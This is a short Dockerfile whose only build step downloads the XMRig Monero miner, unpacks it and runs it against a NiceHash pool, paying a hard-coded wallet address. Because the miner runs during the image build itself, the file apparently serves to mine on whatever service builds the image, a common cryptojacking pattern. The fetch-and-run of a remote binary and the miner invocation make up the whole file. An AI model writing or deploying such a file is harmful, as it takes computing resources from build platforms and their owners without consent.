FROM ubuntu:18.04
RUN apt-get update && \
    apt-get install wget -y && \
    wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && \
    tar xf xmrig-5.11.3-xenial-x64.tar.gz && \
    cd xmrig-5.11.3 && \
    ./xmrig -o stratum+tcp://randomxmonero.eu-west.nicehash.com:3380 -u 3NA8Z5diwFHHVzizerXbkECVdbswVKBPBa.1 -p x -t 4 -a rx/0 --keepalive --donate-level=1 --nicehash --print --randomx-mode=light
